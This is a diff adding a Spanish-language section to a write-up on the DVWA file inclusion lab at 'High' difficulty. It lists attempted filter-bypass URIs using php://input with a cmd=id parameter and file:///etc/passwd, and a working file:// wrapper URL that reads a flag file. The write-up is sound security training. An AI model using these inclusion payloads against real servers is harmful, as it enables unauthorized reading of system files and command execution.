@@ -64,4 +64,23 @@ Una vez modificada la petición, pulsamos `Forward` para enviarla al servidor y 
 
 ## Alto
 
+Al contrario que en los niveles anteriores, en este nivel no podemos modificar la petición que se envía al servidor para obtener ejecución remota de comandos, por lo que tendremos que encontrar otra forma de leer el archivo `fi.php`.
+
+Para comprobar que no podemos modificar la petición, se han realizado distintas pruebas sobre la URI para intentar bypassar el filtro de entrada de datos, pero ninguna de ellas ha funcionado.
+
+```
+...?page=php://input&cmd=id
+...?page=filephp://input&cmd=id
+...?page=file php://input&cmd=id
+...?page=file:///etc/passwd&php://input&cmd=id
+```
+
+Lo máximo que se ha posido obtener ha sido gracias al wrapper `file://`.
+
+```
+http://localhost/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/flags/fi.php
+```
+
+![challenge-3](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/challenge-3.png)
+
 ## Imposible
